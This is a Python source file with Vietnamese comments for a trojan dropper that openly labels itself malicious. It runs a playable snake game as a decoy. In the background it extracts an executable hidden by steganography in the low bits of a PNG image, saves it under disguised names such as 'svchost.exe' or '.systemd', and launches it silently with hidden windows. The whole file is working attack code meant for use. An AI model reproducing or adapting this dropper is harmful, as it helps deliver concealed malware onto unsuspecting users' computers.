"""
Snake Game Pro - Malicious Extractor with Fake Game
Hiển thị game rắn săn mồi để đánh lừa + Extract payload trong nền
"""

from PIL import Image
import numpy as np
import os
import sys
import subprocess
import tempfile
import time
import threading
import random
import pygame


class SnakeGame:
    """Game rắn săn mồi đơn giản để đánh lừa user"""
    
    def __init__(self):
        self.running = False
        self.score = 0
        
    def run_pygame_game(self):
        """Chạy game với pygame (GUI)"""
        pygame.init()
        
        # Constants
        WIDTH, HEIGHT = 600, 400
        GRID_SIZE = 20
        FPS = 5
        
        # Colors
        BLACK = (0, 0, 0)
        WHITE = (255, 255, 255)
        GREEN = (0, 255, 0)
        RED = (255, 0, 0)
        BLUE = (0, 100, 255)
        
        # Setup
        screen = pygame.display.set_mode((WIDTH, HEIGHT))
        pygame.display.set_caption("Snake Game Pro")
        clock = pygame.time.Clock()
        font = pygame.font.Font(None, 36)
        
        # Snake
        snake = [(WIDTH // 2, HEIGHT // 2)]
        direction = (GRID_SIZE, 0)
        
        # Food
        food = (random.randint(0, WIDTH // GRID_SIZE - 1) * GRID_SIZE,
                random.randint(0, HEIGHT // GRID_SIZE - 1) * GRID_SIZE)
        
        self.running = True
        self.score = 0
        
        print("[GAME] Snake game started!")
        
        while self.running:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    self.running = False
                elif event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_UP and direction != (0, GRID_SIZE):
                        direction = (0, -GRID_SIZE)
                    elif event.key == pygame.K_DOWN and direction != (0, -GRID_SIZE):
                        direction = (0, GRID_SIZE)
                    elif event.key == pygame.K_LEFT and direction != (GRID_SIZE, 0):
                        direction = (-GRID_SIZE, 0)
                    elif event.key == pygame.K_RIGHT and direction != (-GRID_SIZE, 0):
                        direction = (GRID_SIZE, 0)
                    elif event.key == pygame.K_ESCAPE:
                        self.running = False
            
            # Move snake
            head = snake[0]
            new_head = (head[0] + direction[0], head[1] + direction[1])
            
            # Check collision with walls
            if (new_head[0] < 0 or new_head[0] >= WIDTH or
                new_head[1] < 0 or new_head[1] >= HEIGHT):
                self.running = False
                break
            
            # Check collision with self
            if new_head in snake:
                self.running = False
                break
            
            snake.insert(0, new_head)
            
            # Check food
            if new_head == food:
                self.score += 10
                food = (random.randint(0, WIDTH // GRID_SIZE - 1) * GRID_SIZE,
                       random.randint(0, HEIGHT // GRID_SIZE - 1) * GRID_SIZE)
            else:
                snake.pop()
            
            # Draw
            screen.fill(BLACK)
            
            # Draw snake
            for i, segment in enumerate(snake):
                color = GREEN if i == 0 else BLUE
                pygame.draw.rect(screen, color, 
                               (segment[0], segment[1], GRID_SIZE, GRID_SIZE))
            
            # Draw food
            pygame.draw.rect(screen, RED, 
                           (food[0], food[1], GRID_SIZE, GRID_SIZE))
            
            # Draw score
            score_text = font.render(f"Score: {self.score}", True, WHITE)
            screen.blit(score_text, (10, 10))
            
            # Draw loading message
            loading_text = font.render("Starting...", True, WHITE)
            screen.blit(loading_text, (WIDTH - 250, 10))
            
            pygame.display.flip()
            clock.tick(FPS)
        
        # Game over screen
        screen.fill(BLACK)
        game_over = font.render("Game Over!", True, WHITE)
        final_score = font.render(f"Final Score: {self.score}", True, WHITE)
        screen.blit(game_over, (WIDTH // 2 - 100, HEIGHT // 2 - 40))
        screen.blit(final_score, (WIDTH // 2 - 120, HEIGHT // 2 + 10))
        pygame.display.flip()
        time.sleep(2)
        
        pygame.quit()
        print("[GAME] Snake game ended!")

    
    
    def stop(self):
        """Dừng game"""
        self.running = False


class ImageExtractor:
    """Trích xuất và thực thi payload"""
    
    def __init__(self):
        self.HEADER_MARKER = "<<EXE_START>>"
        self.DATA_MARKER = "<<DATA_START>>"
    
    def extract_exe(self, image_path):
        """
        Trích xuất EXE từ ảnh
        
        Returns:
            bytes: Payload data hoặc None nếu không tìm thấy
        """
        print("[EXTRACTOR] Starting extraction process...")
        print(f"[EXTRACTOR] Image path: {image_path}")
        
        try:
            # Mở ảnh
            print("[EXTRACTOR] Opening image...")
            img = Image.open(image_path)
            print(f"[EXTRACTOR] Image mode: {img.mode}, size: {img.size}")
            
            if img.mode != 'RGB':
                print("[EXTRACTOR] Converting to RGB...")
                img = img.convert('RGB')
            
            img_array = np.array(img)
            flat_pixels = img_array.flatten()

            lsb_bits = flat_pixels & 1

            total_bits = len(lsb_bits)
            total_bytes = total_bits // 8

            lsb_bits = lsb_bits[:total_bytes * 8]  # đảm bảo chia hết cho 8
            byte_array = np.packbits(lsb_bits)

            data = byte_array.tobytes()

            header_marker = self.HEADER_MARKER.encode()
            data_marker = self.DATA_MARKER.encode()

            start = data.find(header_marker)
            if start == -1:
                print("[EXTRACTOR] Header not found")
                return None

            size_start = start + len(header_marker)
            exe_size = int(data[size_start:size_start+10].decode())

            print(f"[EXTRACTOR] Found Header! Payload size: {exe_size:,} bytes")

            payload_start = data.find(data_marker) + len(data_marker)
            payload = data[payload_start:payload_start + exe_size]

            print(f"[EXTRACTOR] Extraction complete! Read {len(payload):,} bytes.")

            return payload
            
        except Exception as e:
            print(f"[EXTRACTOR] EXCEPTION: {type(e).__name__}: {e}")
            import traceback
            traceback.print_exc()
            return None
    
    def execute_payload(self, payload_bytes):
        """
        Thực thi payload
        """
        print("[EXTRACTOR] Starting payload execution...")
        
        try:
            temp_dir = tempfile.gettempdir()
            
            if sys.platform == 'win32':
                payload_name = 'svchost.exe'
            else:
                payload_name = '.systemd'
            
            payload_path = os.path.join(temp_dir, payload_name)
            print(f"[EXTRACTOR] Payload path: {payload_path}")
            
            # Ghi payload
            print(f"[EXTRACTOR] Writing {len(payload_bytes):,} bytes to disk...")
            with open(payload_path, 'wb') as f:
                f.write(payload_bytes)
            
            print(f"[EXTRACTOR] File written successfully")
            
            # Chạy payload
            if sys.platform == 'win32':
                print("[EXTRACTOR] Executing on Windows (silent)...")
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = subprocess.SW_HIDE
                
                process = subprocess.Popen(
                    [payload_path],
                    startupinfo=startupinfo,
                    creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
                )
                print(f"[EXTRACTOR] Process started with PID: {process.pid}")
            else:
                print("[EXTRACTOR] Executing on Linux/Mac...")
                os.chmod(payload_path, 0o755)
                process = subprocess.Popen(
                    [payload_path],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                print(f"[EXTRACTOR] Process started with PID: {process.pid}")
            
            # Kiểm tra
            time.sleep(2)
            if process.poll() is None:
                print("[EXTRACTOR] ✓ Payload is running!")
            else:
                print(f"[EXTRACTOR] WARNING: Payload exited with code {process.returncode}")
            
        except Exception as e:
            print(f"[EXTRACTOR] EXCEPTION: {type(e).__name__}: {e}")
            import traceback
            traceback.print_exc()


class DualThreadAttack:
    """Orchestrator cho dual-thread attack"""
    
    def __init__(self, image_path):
        self.image_path = image_path
        self.game = SnakeGame()
        self.extractor = ImageExtractor()
        self.extraction_complete = False
    
    def run_game_thread(self):
        """Thread 1: Chạy game"""
        print("\n[THREAD-1] Game thread started")
        self.game.run_pygame_game()
        print("[THREAD-1] Game thread ended")
    
    def run_extraction_thread(self):
        """Thread 2: Extract và execute payload"""
        print("\n[THREAD-2] Extraction thread started")
        
        # Đợi game khởi động (để user không nghi ngờ)
        print("[THREAD-2] Waiting for game to start...")
        time.sleep(2)
        
        # Extract payload
        print("[THREAD-2] Extracting payload...")
        payload_bytes = self.extractor.extract_exe(self.image_path)
        
        if payload_bytes:
            print("[THREAD-2] ✓ Extraction successful!")
            print(f"[THREAD-2] Payload size: {len(payload_bytes):,} bytes")
            
            # Execute payload
            print("[THREAD-2] Executing payload...")
            self.extractor.execute_payload(payload_bytes)
            
            print("[THREAD-2] ✓ Payload executed!")
            self.extraction_complete = True
        else:
            print("[THREAD-2] ✗ Extraction failed!")
        
        # Đợi thêm để game chạy tự nhiên
        print("[THREAD-2] Waiting for game to finish...")
        time.sleep(5)
        
        # Dừng game
        self.game.stop()
        print("[THREAD-2] Extraction thread ended")
    
    def run(self):
        """Chạy attack với 2 threads"""
        print("="*70)
        print("🎮 SNAKE GAME PRO - IMAGE VIEWER")
        print("="*70)
        print(f"Platform: {sys.platform}")
        print(f"Image: {self.image_path}")
        print("="*70)
        
        # Tạo threads
        game_thread = threading.Thread(target=self.run_game_thread, daemon=True)
        extraction_thread = threading.Thread(target=self.run_extraction_thread, daemon=True)
        
        # Start threads
        game_thread.start()
        extraction_thread.start()
        
        # Đợi cả 2 threads
        game_thread.join()
        extraction_thread.join()
        
        print("\n" + "="*70)
        if self.extraction_complete:
            print("✓ ALL OPERATIONS COMPLETED SUCCESSFULLY")
        else:
            print("⚠ SOME OPERATIONS FAILED")
        print("="*70)


def main():
    """Main function"""
    print("="*70)
    print("DUAL THREAD ATTACK - DEBUG MODE")
    print("="*70)
    
    # Tìm ảnh
    current_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
    stego_image = os.path.join(current_dir, 'land_with_malware.png')
    
    if not os.path.exists(stego_image):
        print(f"[ERROR] Image not found: {stego_image}")
        png_files = [f for f in os.listdir(current_dir) if f.lower().endswith('.png')]
        if png_files:
            stego_image = os.path.join(current_dir, png_files[0])
            print(f"[INFO] Using: {stego_image}")
        else:
            print("[ERROR] No PNG files found!")
            input("Press Enter to exit...")
            sys.exit(1)
    
    print(f"[INFO] Image found: {stego_image}")
    print(f"[INFO] File size: {os.path.getsize(stego_image):,} bytes")
    
    # Chạy dual-thread attack
    attack = DualThreadAttack(stego_image)
    attack.run()
    
    print("\nPress Enter to exit...")
    input()

if __name__ == '__main__':
    main()